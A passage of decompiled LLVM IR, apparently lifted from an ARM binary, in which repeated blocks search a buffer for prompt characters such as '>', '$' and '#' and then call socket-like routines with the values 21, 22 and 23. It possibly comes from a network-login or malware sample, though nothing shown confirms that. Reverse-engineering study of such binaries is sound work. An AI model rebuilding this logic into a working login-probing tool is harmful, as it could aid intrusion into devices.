bb392:                                            ; preds = %dec_label_pc_11260
  %v3_11268 = icmp ugt i8 %v3_11260, 57
  store i1 %v3_11268, i1* %cpsr_c.global-to-local, align 1
  %v8_11268 = icmp eq i8 %v3_11260, 58
  store i1 %v8_11268, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11268, label %dec_label_pc_11270, label %dec_label_pc_1123c

dec_label_pc_11270:                               ; preds = %dec_label_pc_11260, %bb392, %dec_label_pc_1124c, %dec_label_pc_11244, %dec_label_pc_1123c, %dec_label_pc_11124, %dec_label_pc_11100, %dec_label_pc_1111c, %dec_label_pc_11114, %bb391
  %v0_11274 = phi i32 [ %v1_110f4, %dec_label_pc_11124 ], [ %v1_110f4, %dec_label_pc_11100 ], [ %v1_110f4, %dec_label_pc_1111c ], [ %v1_110f4, %dec_label_pc_11114 ], [ %v1_110f4, %bb391 ], [ %v1_11258, %dec_label_pc_1123c ], [ %v1_11258, %dec_label_pc_11244 ], [ %v1_11258, %dec_label_pc_1124c ], [ %v1_11258, %bb392 ], [ %v1_11258, %dec_label_pc_11260 ]
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_11274 = add i32 %v0_11274, 1
  store i32 %v1_11274, i32* @r8, align 4
  %v1_11278 = call i32 @function_11be8(i32 22)
  store i32 %v2_11428, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_11288 = call i32 @function_11b24(i32 22, i32* nonnull %stack_var_-60)
  store i32 %v3_11288, i32* %r0.global-to-local, align 4
  %v3_1128c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_1128c, i32* %r2.global-to-local, align 4
  store i32 %v3_11288, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11298 = load i32, i32* @r6, align 4
  %v1_11298 = add i32 %v0_11298, 4
  %v2_11298 = inttoptr i32 %v1_11298 to i32*
  %v3_11298 = load i32, i32* %v2_11298, align 4
  store i32 %v3_11298, i32* %r0.global-to-local, align 4
  %v4_1129c = call i32 @function_13884(i32 %v3_11298, i32 %v3_11288, i32 %v3_1128c, i32 16384)
  store i32 %v4_1129c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_112ac = load i32, i32* @r6, align 4
  %v1_112ac = add i32 %v0_112ac, 4
  %v2_112ac = inttoptr i32 %v1_112ac to i32*
  %v3_112ac = load i32, i32* %v2_112ac, align 4
  store i32 %v3_112ac, i32* %r0.global-to-local, align 4
  %v4_112b0 = call i32 @function_13884(i32 %v3_112ac, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32 2, i32 16384)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_112b8 = call i32 @function_11b48(i32 22)
  store i32 %v1_112b8, i32* %r0.global-to-local, align 4
  store i32 7, i32* @r3, align 4
  %v1_112c0 = load i32, i32* @r6, align 4
  %v2_112c0 = add i32 %v1_112c0, 12
  %v3_112c0 = inttoptr i32 %v2_112c0 to i32*
  store i32 7, i32* %v3_112c0, align 4
  br label %dec_label_pc_10f20

dec_label_pc_112c8:                               ; preds = %dec_label_pc_10e04
  %v1_112c8 = add i32 %v0_10e04, 24
  %v2_112c8 = inttoptr i32 %v1_112c8 to i32*
  %v3_112c8 = load i32, i32* %v2_112c8, align 4
  store i32 %v3_112c8, i32* %r2.global-to-local, align 4
  %v1_112cc = add i32 %v3_112c8, -1
  store i32 %v1_112cc, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_112d0 = icmp eq i32 %v1_112cc, 0
  store i1 %v2_112d0, i1* %cpsr_z.global-to-local, align 1
  %tmp393 = icmp slt i32 %v1_112cc, 1
  br i1 %tmp393, label %dec_label_pc_10d84thread-pre-split.thread, label %dec_label_pc_112d8

dec_label_pc_112d8:                               ; preds = %dec_label_pc_112c8
  %v2_112d8 = add i32 %v1_112cc, %v0_10e04
  store i32 %v2_112d8, i32* %r3.global-to-local, align 4
  %v1_112dc = add i32 %v2_112d8, 28
  %v2_112dc = inttoptr i32 %v1_112dc to i8*
  %v3_112dc = load i8, i8* %v2_112dc, align 1
  %v4_112dc = zext i8 %v3_112dc to i32
  store i32 %v4_112dc, i32* %r3.global-to-local, align 4
  %v2_112e0 = icmp ugt i8 %v3_112dc, 61
  store i1 %v2_112e0, i1* %cpsr_c.global-to-local, align 1
  %v7_112e0 = icmp eq i8 %v3_112dc, 62
  store i1 %v7_112e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112e0, label %dec_label_pc_11344, label %bb394

bb394:                                            ; preds = %dec_label_pc_112d8
  %v3_112e4 = icmp ugt i8 %v3_112dc, 57
  store i1 %v3_112e4, i1* %cpsr_c.global-to-local, align 1
  %v8_112e4 = icmp eq i8 %v3_112dc, 58
  store i1 %v8_112e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_112e4, label %dec_label_pc_11344, label %dec_label_pc_112ec

dec_label_pc_112ec:                               ; preds = %bb394
  %v2_112ec = icmp ugt i8 %v3_112dc, 35
  store i1 %v2_112ec, i1* %cpsr_c.global-to-local, align 1
  %v7_112ec = icmp eq i8 %v3_112dc, 36
  store i1 %v7_112ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112ec, label %dec_label_pc_11344, label %dec_label_pc_112f4

dec_label_pc_112f4:                               ; preds = %dec_label_pc_112ec
  %v2_112f4 = icmp ugt i8 %v3_112dc, 34
  store i1 %v2_112f4, i1* %cpsr_c.global-to-local, align 1
  %v7_112f4 = icmp eq i8 %v3_112dc, 35
  store i1 %v7_112f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112f4, label %dec_label_pc_11344, label %dec_label_pc_112fc

dec_label_pc_112fc:                               ; preds = %dec_label_pc_112f4
  %v2_112fc = icmp ugt i8 %v3_112dc, 36
  store i1 %v2_112fc, i1* %cpsr_c.global-to-local, align 1
  %v7_112fc = icmp eq i8 %v3_112dc, 37
  store i1 %v7_112fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112fc, label %dec_label_pc_11344, label %dec_label_pc_1132c.preheader

dec_label_pc_1132c.preheader:                     ; preds = %dec_label_pc_112fc
  %v3_11300 = add i32 %v0_10e04, 28
  %v2_11304 = add i32 %v3_11300, %v3_112c8
  store i32 %v2_11304, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1132c

dec_label_pc_11310:                               ; preds = %bb395
  %v2_11310 = icmp ugt i8 %v3_11334, 35
  store i1 %v2_11310, i1* %cpsr_c.global-to-local, align 1
  %v7_11310 = icmp eq i8 %v3_11334, 36
  store i1 %v7_11310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11310, label %dec_label_pc_11344, label %dec_label_pc_11318

dec_label_pc_11318:                               ; preds = %dec_label_pc_11310
  %v2_11318 = icmp ugt i8 %v3_11334, 34
  store i1 %v2_11318, i1* %cpsr_c.global-to-local, align 1
  %v7_11318 = icmp eq i8 %v3_11334, 35
  store i1 %v7_11318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11318, label %dec_label_pc_11344, label %dec_label_pc_11320

dec_label_pc_11320:                               ; preds = %dec_label_pc_11318
  %v2_11320 = icmp ugt i8 %v3_11334, 36
  store i1 %v2_11320, i1* %cpsr_c.global-to-local, align 1
  %v7_11320 = icmp eq i8 %v3_11334, 37
  store i1 %v7_11320, i1* %cpsr_z.global-to-local, align 1
  %v1_11324 = add i32 %v0_11324, -1
  store i32 %v1_11324, i32* %r3.global-to-local, align 4
  br i1 %v7_11320, label %dec_label_pc_11344, label %dec_label_pc_1132c

dec_label_pc_1132c:                               ; preds = %dec_label_pc_1132c.preheader, %dec_label_pc_11320
  %v0_11324 = phi i32 [ %v2_11304, %dec_label_pc_1132c.preheader ], [ %v1_11324, %dec_label_pc_11320 ]
  %v0_1132c = phi i32 [ %v1_112cc, %dec_label_pc_1132c.preheader ], [ %v1_1132c, %dec_label_pc_11320 ]
  %v1_1132c = add i32 %v0_1132c, -1
  store i32 %v1_1132c, i32* %r1.global-to-local, align 4
  %v2_1132c = icmp ne i32 %v0_1132c, 0
  store i1 %v2_1132c, i1* %cpsr_c.global-to-local, align 1
  %v7_1132c = icmp eq i32 %v0_1132c, 1
  store i1 %v7_1132c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1132c, label %dec_label_pc_10d84thread-pre-split.thread512, label %dec_label_pc_11334

dec_label_pc_11334:                               ; preds = %dec_label_pc_1132c
  %v1_11334 = add i32 %v0_11324, -2
  %v2_11334 = inttoptr i32 %v1_11334 to i8*
  %v3_11334 = load i8, i8* %v2_11334, align 1
  %v4_11334 = zext i8 %v3_11334 to i32
  store i32 %v4_11334, i32* %r2.global-to-local, align 4
  %v2_11338 = icmp ugt i8 %v3_11334, 61
  store i1 %v2_11338, i1* %cpsr_c.global-to-local, align 1
  %v7_11338 = icmp eq i8 %v3_11334, 62
  store i1 %v7_11338, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11338, label %dec_label_pc_11344, label %bb395

bb395:                                            ; preds = %dec_label_pc_11334
  %v3_1133c = icmp ugt i8 %v3_11334, 57
  store i1 %v3_1133c, i1* %cpsr_c.global-to-local, align 1
  %v8_1133c = icmp eq i8 %v3_11334, 58
  store i1 %v8_1133c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1133c, label %dec_label_pc_11344, label %dec_label_pc_11310

dec_label_pc_11344:                               ; preds = %dec_label_pc_11334, %bb395, %dec_label_pc_11320, %dec_label_pc_11318, %dec_label_pc_11310, %dec_label_pc_112fc, %dec_label_pc_112d8, %dec_label_pc_112f4, %dec_label_pc_112ec, %bb394
  %v0_11348 = phi i32 [ %v1_112cc, %dec_label_pc_112fc ], [ %v1_112cc, %dec_label_pc_112d8 ], [ %v1_112cc, %dec_label_pc_112f4 ], [ %v1_112cc, %dec_label_pc_112ec ], [ %v1_112cc, %bb394 ], [ %v1_1132c, %dec_label_pc_11310 ], [ %v1_1132c, %dec_label_pc_11318 ], [ %v1_1132c, %dec_label_pc_11320 ], [ %v1_1132c, %bb395 ], [ %v1_1132c, %dec_label_pc_11334 ]
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_11348 = add i32 %v0_11348, 1
  store i32 %v1_11348, i32* @r8, align 4
  %v1_1134c = call i32 @function_11be8(i32 23)
  store i32 %v2_11428, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v3_1135c = call i32 @function_11b24(i32 23, i32* nonnull %stack_var_-60)
  store i32 %v3_1135c, i32* %r0.global-to-local, align 4
  %v3_11360 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_11360, i32* %r2.global-to-local, align 4
  store i32 %v3_1135c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1136c = load i32, i32* @r6, align 4
  %v1_1136c = add i32 %v0_1136c, 4
  %v2_1136c = inttoptr i32 %v1_1136c to i32*
  %v3_1136c = load i32, i32* %v2_1136c, align 4
  store i32 %v3_1136c, i32* %r0.global-to-local, align 4
  %v4_11370 = call i32 @function_13884(i32 %v3_1136c, i32 %v3_1135c, i32 %v3_11360, i32 16384)
  store i32 %v4_11370, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_11380 = load i32, i32* @r6, align 4
  %v1_11380 = add i32 %v0_11380, 4
  %v2_11380 = inttoptr i32 %v1_11380 to i32*
  %v3_11380 = load i32, i32* %v2_11380, align 4
  store i32 %v3_11380, i32* %r0.global-to-local, align 4
  %v4_11384 = call i32 @function_13884(i32 %v3_11380, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32 2, i32 16384)
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_1138c = call i32 @function_11b48(i32 23)
  store i32 %v1_1138c, i32* %r0.global-to-local, align 4
  store i32 9, i32* @r3, align 4
  %v1_11394 = load i32, i32* @r6, align 4
  %v2_11394 = add i32 %v1_11394, 12
  %v3_11394 = inttoptr i32 %v2_11394 to i32*
  store i32 9, i32* %v3_11394, align 4
  br label %dec_label_pc_10f20

dec_label_pc_1139c:                               ; preds = %dec_label_pc_10e04
  %v1_1139c = add i32 %v0_10e04, 24
  %v2_1139c = inttoptr i32 %v1_1139c to i32*
  %v3_1139c = load i32, i32* %v2_1139c, align 4
  store i32 %v3_1139c, i32* %r2.global-to-local, align 4
  %v1_113a0 = add i32 %v3_1139c, -1
  store i32 %v1_113a0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_113a4 = icmp eq i32 %v1_113a0, 0
  store i1 %v2_113a4, i1* %cpsr_z.global-to-local, align 1
  %tmp396 = icmp slt i32 %v1_113a0, 1
  br i1 %tmp396, label %dec_label_pc_10d84thread-pre-split.thread, label %dec_label_pc_113ac

dec_label_pc_113ac:                               ; preds = %dec_label_pc_1139c
  %v2_113ac = add i32 %v1_113a0, %v0_10e04
  store i32 %v2_113ac, i32* %r3.global-to-local, align 4
  %v1_113b0 = add i32 %v2_113ac, 28
  %v2_113b0 = inttoptr i32 %v1_113b0 to i8*
  %v3_113b0 = load i8, i8* %v2_113b0, align 1
  %v4_113b0 = zext i8 %v3_113b0 to i32
  store i32 %v4_113b0, i32* %r3.global-to-local, align 4
  %v2_113b4 = icmp ugt i8 %v3_113b0, 61
  store i1 %v2_113b4, i1* %cpsr_c.global-to-local, align 1
  %v7_113b4 = icmp eq i8 %v3_113b0, 62
  store i1 %v7_113b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113b4, label %dec_label_pc_11418, label %bb397

bb397:                                            ; preds = %dec_label_pc_113ac
  %v3_113b8 = icmp ugt i8 %v3_113b0, 57
  store i1 %v3_113b8, i1* %cpsr_c.global-to-local, align 1
  %v8_113b8 = icmp eq i8 %v3_113b0, 58
  store i1 %v8_113b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_113b8, label %dec_label_pc_11418, label %dec_label_pc_113c0

dec_label_pc_113c0:                               ; preds = %bb397
  %v2_113c0 = icmp ugt i8 %v3_113b0, 35
  store i1 %v2_113c0, i1* %cpsr_c.global-to-local, align 1
  %v7_113c0 = icmp eq i8 %v3_113b0, 36
  store i1 %v7_113c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113c0, label %dec_label_pc_11418, label %dec_label_pc_113c8

dec_label_pc_113c8:                               ; preds = %dec_label_pc_113c0
  %v2_113c8 = icmp ugt i8 %v3_113b0, 34
  store i1 %v2_113c8, i1* %cpsr_c.global-to-local, align 1
  %v7_113c8 = icmp eq i8 %v3_113b0, 35
  store i1 %v7_113c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113c8, label %dec_label_pc_11418, label %dec_label_pc_113d0

dec_label_pc_113d0:                               ; preds = %dec_label_pc_113c8
  %v2_113d0 = icmp ugt i8 %v3_113b0, 36
  store i1 %v2_113d0, i1* %cpsr_c.global-to-local, align 1
  %v7_113d0 = icmp eq i8 %v3_113b0, 37
  store i1 %v7_113d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113d0, label %dec_label_pc_11418, label %dec_label_pc_11400.preheader

dec_label_pc_11400.preheader:                     ; preds = %dec_label_pc_113d0
  %v3_113d4 = add i32 %v0_10e04, 28
  %v2_113d8 = add i32 %v3_113d4, %v3_1139c
  store i32 %v2_113d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11400

dec_label_pc_113e4:                               ; preds = %bb398
  %v2_113e4 = icmp ugt i8 %v3_11408, 35
  store i1 %v2_113e4, i1* %cpsr_c.global-to-local, align 1
  %v7_113e4 = icmp eq i8 %v3_11408, 36
  store i1 %v7_113e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113e4, label %dec_label_pc_11418, label %dec_label_pc_113ec

dec_label_pc_113ec:                               ; preds = %dec_label_pc_113e4
  %v2_113ec = icmp ugt i8 %v3_11408, 34
  store i1 %v2_113ec, i1* %cpsr_c.global-to-local, align 1
  %v7_113ec = icmp eq i8 %v3_11408, 35
  store i1 %v7_113ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113ec, label %dec_label_pc_11418, label %dec_label_pc_113f4

dec_label_pc_113f4:                               ; preds = %dec_label_pc_113ec
  %v2_113f4 = icmp ugt i8 %v3_11408, 36
  store i1 %v2_113f4, i1* %cpsr_c.global-to-local, align 1
  %v7_113f4 = icmp eq i8 %v3_11408, 37
  store i1 %v7_113f4, i1* %cpsr_z.global-to-local, align 1
  %v1_113f8 = add i32 %v0_113f8, -1
  store i32 %v1_113f8, i32* %r3.global-to-local, align 4
  br i1 %v7_113f4, label %dec_label_pc_11418, label %dec_label_pc_11400

dec_label_pc_11400:                               ; preds = %dec_label_pc_11400.preheader, %dec_label_pc_113f4
  %v0_113f8 = phi i32 [ %v2_113d8, %dec_label_pc_11400.preheader ], [ %v1_113f8, %dec_label_pc_113f4 ]
  %v0_11400 = phi i32 [ %v1_113a0, %dec_label_pc_11400.preheader ], [ %v1_11400, %dec_label_pc_113f4 ]
  %v1_11400 = add i32 %v0_11400, -1
  store i32 %v1_11400, i32* %r1.global-to-local, align 4
  %v2_11400 = icmp ne i32 %v0_11400, 0
  store i1 %v2_11400, i1* %cpsr_c.global-to-local, align 1
  %v7_11400 = icmp eq i32 %v0_11400, 1
  store i1 %v7_11400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11400, label %dec_label_pc_10d84thread-pre-split.thread512, label %dec_label_pc_11408

dec_label_pc_11408:                               ; preds = %dec_label_pc_11400
  %v1_11408 = add i32 %v0_113f8, -2
  %v2_11408 = inttoptr i32 %v1_11408 to i8*
  %v3_11408 = load i8, i8* %v2_11408, align 1
  %v4_11408 = zext i8 %v3_11408 to i32
  store i32 %v4_11408, i32* %r2.global-to-local, align 4
  %v2_1140c = icmp ugt i8 %v3_11408, 61
  store i1 %v2_1140c, i1* %cpsr_c.global-to-local, align 1
  %v7_1140c = icmp eq i8 %v3_11408, 62
  store i1 %v7_1140c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1140c, label %dec_label_pc_11418, label %bb398

bb398:                                            ; preds = %dec_label_pc_11408
  %v3_11410 = icmp ugt i8 %v3_11408, 57
  store i1 %v3_11410, i1* %cpsr_c.global-to-local, align 1
  %v8_11410 = icmp eq i8 %v3_11408, 58
  store i1 %v8_11410, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11410, label %dec_label_pc_11418, label %dec_label_pc_113e4

dec_label_pc_11418:                               ; preds = %dec_label_pc_11408, %bb398, %dec_label_pc_113f4, %dec_label_pc_113ec, %dec_label_pc_113e4, %dec_label_pc_113d0, %dec_label_pc_113ac, %dec_label_pc_113c8, %dec_label_pc_113c0, %bb397
  %v0_1141c = phi i32 [ %v1_113a0, %dec_label_pc_113d0 ], [ %v1_113a0, %dec_label_pc_113ac ], [ %v1_113a0, %dec_label_pc_113c8 ], [ %v1_113a0, %dec_label_pc_113c0 ], [ %v1_113a0, %bb397 ], [ %v1_11400, %dec_label_pc_113e4 ], [ %v1_11400, %dec_label_pc_113ec ], [ %v1_11400, %dec_label_pc_113f4 ], [ %v1_11400, %bb398 ], [ %v1_11400, %dec_label_pc_11408 ]
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_1141c = add i32 %v0_1141c, 1
  store i32 %v1_1141c, i32* @r8, align 4
  %v1_11420 = call i32 @function_11be8(i32 21)
  store i32 %v2_11428, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_11430 = call i32 @function_11b24(i32 21, i32* nonnull %stack_var_-60)
  store i32 %v3_11430, i32* %r0.global-to-local, align 4
  %v3_11434 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_11434, i32* %r2.global-to-local, align 4
  store i32 %v3_11430, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11440 = load i32, i32* @r6, align 4
  %v1_11440 = add i32 %v0_11440, 4
  %v2_11440 = inttoptr i32 %v1_11440 to i32*
  %v3_11440 = load i32, i32* %v2_11440, align 4
  store i32 %v3_11440, i32* %r0.global-to-local, align 4
  %v4_11444 = call i32 @function_13884(i32 %v3_11440, i32 %v3_11430, i32 %v3_11434, i32 16384)
  store i32 %v4_11444, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_11454 = load i32, i32* @r6, align 4
  %v1_11454 = add i32 %v0_11454, 4
  %v2_11454 = inttoptr i32 %v1_11454 to i32*
  %v3_11454 = load i32, i32* %v2_11454, align 4
  store i32 %v3_11454, i32* %r0.global-to-local, align 4
  %v4_11458 = call i32 @function_13884(i32 %v3_11454, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32 2, i32 16384)
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_11460 = call i32 @function_11b48(i32 21)
  store i32 %v1_11460, i32* %r0.global-to-local, align 4
  store i32 6, i32* @r3, align 4
  %v1_11468 = load i32, i32* @r6, align 4
  %v2_11468 = add i32 %v1_11468, 12
  %v3_11468 = inttoptr i32 %v2_11468 to i32*
  store i32 6, i32* %v3_11468, align 4
  br label %dec_label_pc_10f20

dec_label_pc_11470:                               ; preds = %dec_label_pc_10e04
  %v1_11470 = add i32 %v0_10e04, 24
  %v2_11470 = inttoptr i32 %v1_11470 to i32*
  %v3_11470 = load i32, i32* %v2_11470, align 4
  store i32 %v3_11470, i32* %r1.global-to-local, align 4
  %v1_11474 = add i32 %v3_11470, -1
  store i32 %v1_11474, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11478 = icmp eq i32 %v1_11474, 0
  store i1 %v2_11478, i1* %cpsr_z.global-to-local, align 1
  %tmp399 = icmp slt i32 %v1_11474, 1
  br i1 %tmp399, label %dec_label_pc_114ec, label %dec_label_pc_11480

dec_label_pc_11480:                               ; preds = %dec_label_pc_11470
  %v2_11480 = add i32 %v1_11474, %v0_10e04
  store i32 %v2_11480, i32* %r3.global-to-local, align 4
  %v1_11484 = add i32 %v2_11480, 28
  %v2_11484 = inttoptr i32 %v1_11484 to i8*
  %v3_11484 = load i8, i8* %v2_11484, align 1
  %v4_11484 = zext i8 %v3_11484 to i32
  store i32 %v4_11484, i32* %r3.global-to-local, align 4
  %v2_11488 = icmp ugt i8 %v3_11484, 61
  store i1 %v2_11488, i1* %cpsr_c.global-to-local, align 1
  %v7_11488 = icmp eq i8 %v3_11484, 62
  store i1 %v7_11488, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11488, label %dec_label_pc_116f4, label %bb400

bb400:                                            ; preds = %dec_label_pc_11480
  %v3_1148c = icmp ugt i8 %v3_11484, 57
  store i1 %v3_1148c, i1* %cpsr_c.global-to-local, align 1
  %v8_1148c = icmp eq i8 %v3_11484, 58
  store i1 %v8_1148c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1148c, label %dec_label_pc_116f4, label %dec_label_pc_11494

dec_label_pc_11494:                               ; preds = %bb400
  %v2_11494 = icmp ugt i8 %v3_11484, 35
  store i1 %v2_11494, i1* %cpsr_c.global-to-local, align 1
  %v7_11494 = icmp eq i8 %v3_11484, 36
  store i1 %v7_11494, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11494, label %dec_label_pc_116f4, label %dec_label_pc_1149c

dec_label_pc_1149c:                               ; preds = %dec_label_pc_11494
  %v2_1149c = icmp ugt i8 %v3_11484, 34
  store i1 %v2_1149c, i1* %cpsr_c.global-to-local, align 1
  %v7_1149c = icmp eq i8 %v3_11484, 35
  store i1 %v7_1149c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1149c, label %dec_label_pc_116f4, label %dec_label_pc_114a4

dec_label_pc_114a4:                               ; preds = %dec_label_pc_1149c
  %v2_114a4 = icmp ugt i8 %v3_11484, 36
  store i1 %v2_114a4, i1* %cpsr_c.global-to-local, align 1
  %v7_114a4 = icmp eq i8 %v3_11484, 37
  store i1 %v7_114a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114a4, label %dec_label_pc_116f4, label %dec_label_pc_114e4.preheader

dec_label_pc_114e4.preheader:                     ; preds = %dec_label_pc_114a4
  %v3_114a8 = add i32 %v0_10e04, 28
  %v2_114ac = add i32 %v3_114a8, %v3_11470
  store i32 %v2_114ac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_114e4

dec_label_pc_114b8:                               ; preds = %dec_label_pc_114e4
  %v1_114b8 = add i32 %v0_114dc, -2
  %v2_114b8 = inttoptr i32 %v1_114b8 to i8*
  %v3_114b8 = load i8, i8* %v2_114b8, align 1
  %v4_114b8 = zext i8 %v3_114b8 to i32
  store i32 %v4_114b8, i32* %r2.global-to-local, align 4
  %v2_114bc = icmp ugt i8 %v3_114b8, 61
  store i1 %v2_114bc, i1* %cpsr_c.global-to-local, align 1
  %v7_114bc = icmp eq i8 %v3_114b8, 62
  store i1 %v7_114bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114bc, label %dec_label_pc_116f4, label %bb401

bb401:                                            ; preds = %dec_label_pc_114b8
  %v3_114c0 = icmp ugt i8 %v3_114b8, 57
  store i1 %v3_114c0, i1* %cpsr_c.global-to-local, align 1
  %v8_114c0 = icmp eq i8 %v3_114b8, 58
  store i1 %v8_114c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_114c0, label %dec_label_pc_116f4, label %dec_label_pc_114c8

dec_label_pc_114c8:                               ; preds = %bb401
  %v2_114c8 = icmp ugt i8 %v3_114b8, 35
  store i1 %v2_114c8, i1* %cpsr_c.global-to-local, align 1
  %v7_114c8 = icmp eq i8 %v3_114b8, 36
  store i1 %v7_114c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114c8, label %dec_label_pc_116f4, label %dec_label_pc_114d0

dec_label_pc_114d0:                               ; preds = %dec_label_pc_114c8
  %v2_114d0 = icmp ugt i8 %v3_114b8, 34
  store i1 %v2_114d0, i1* %cpsr_c.global-to-local, align 1
  %v7_114d0 = icmp eq i8 %v3_114b8, 35
  store i1 %v7_114d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114d0, label %dec_label_pc_116f4, label %dec_label_pc_114d8

dec_label_pc_114d8:                               ; preds = %dec_label_pc_114d0
  %v2_114d8 = icmp ugt i8 %v3_114b8, 36
  store i1 %v2_114d8, i1* %cpsr_c.global-to-local, align 1
  %v7_114d8 = icmp eq i8 %v3_114b8, 37
  store i1 %v7_114d8, i1* %cpsr_z.global-to-local, align 1
  %v1_114dc = add i32 %v0_114dc, -1
  store i32 %v1_114dc, i32* %r3.global-to-local, align 4
  br i1 %v7_114d8, label %dec_label_pc_116f4, label %dec_label_pc_114e4

dec_label_pc_114e4:                               ; preds = %dec_label_pc_114e4.preheader, %dec_label_pc_114d8
  %v0_114dc = phi i32 [ %v2_114ac, %dec_label_pc_114e4.preheader ], [ %v1_114dc, %dec_label_pc_114d8 ]
  %v0_114e4 = phi i32 [ %v1_11474, %dec_label_pc_114e4.preheader ], [ %v1_114e4, %dec_label_pc_114d8 ]
  %v1_114e4 = add i32 %v0_114e4, -1
  store i32 %v1_114e4, i32* %r0.global-to-local, align 4
  %v2_114e4 = icmp ne i32 %v0_114e4, 0
  store i1 %v2_114e4, i1* %cpsr_c.global-to-local, align 1
  %v7_114e4 = icmp eq i32 %v0_114e4, 1
  store i1 %v7_114e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114e4, label %dec_label_pc_114ec, label %dec_label_pc_114b8

dec_label_pc_114ec:                               ; preds = %dec_label_pc_114e4, %dec_label_pc_11470
  %v0_114ec = load i32, i32* @fp, align 4
  store i32 %v0_114ec, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_187a0.315 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_114f8 = call i32 @function_12538(i32 %v0_114ec, i32 %v3_11470, i32 ptrtoint ([5 x i8]* @global_var_187a0.315 to i32), i32 4)
  store i32 %v5_114f8, i32* %r0.global-to-local, align 4
  %v2_114fc = icmp eq i32 %v5_114f8, -1
  store i1 %v2_114fc, i1* %cpsr_c.global-to-local, align 1
  %v7_114fc = icmp eq i32 %v5_114f8, -1
  store i1 %v7_114fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_114f8, i32* @r8, align 4
  br i1 %v7_114fc, label %dec_label_pc_11ac0, label %dec_label_pc_11508

dec_label_pc_11508:                               ; preds = %dec_label_pc_11ac0, %dec_label_pc_114ec
  %v0_11508 = phi i32 [ %v5_11ad0, %dec_label_pc_11ac0 ], [ %v5_114f8, %dec_label_pc_114ec ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11508 = icmp eq i32 %v0_11508, 0
  store i1 %v2_11508, i1* %cpsr_z.global-to-local, align 1
  %v5_1150c = icmp sgt i32 %v0_11508, 0
  br i1 %v5_1150c, label %dec_label_pc_11508.dec_label_pc_116f8_crit_edge, label %dec_label_pc_11510

dec_label_pc_11508.dec_label_pc_116f8_crit_edge:  ; preds = %dec_label_pc_11508
  %v0_116f8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_116f8

